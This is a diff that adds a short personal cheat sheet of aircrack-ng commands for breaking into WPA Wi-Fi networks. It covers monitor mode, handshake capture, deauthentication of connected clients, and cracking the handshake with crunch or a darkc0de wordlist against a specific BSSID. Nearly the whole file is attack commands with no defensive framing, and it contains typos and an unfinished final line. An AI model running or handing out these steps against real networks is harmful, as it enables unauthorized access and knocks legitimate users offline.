@@ -1,0 +1,21 @@
+#this is the slow way to hack
+airmon-ng check kill
+airmon-ng start wlan0
+airodump-ng wlan0mon
+airodump-ng --ignore-negative-one --bssid bssid -c channel -w write_file interface(wlan0mon)
+aireplay-ng --deauth 10 --ignore-negative-one -a bssid -c station interface
+
+#wait for the wpahandshake
+#decrypt
+crunch min max charater(abcdefg...) set | aircrack-ng -b bssid .cap(file in ~) -w-
+
+
+#use the darkcOrd.list to decrypt
+#service network-manager start
+
+aircrack -ng -w /home/tmd/hacking/darkc0de.lst -b 3C:1E:04:0F:6A:7C /home/tmd/hacking/-01.cap
+
+
+
+#also when have the wpa shakehando
+
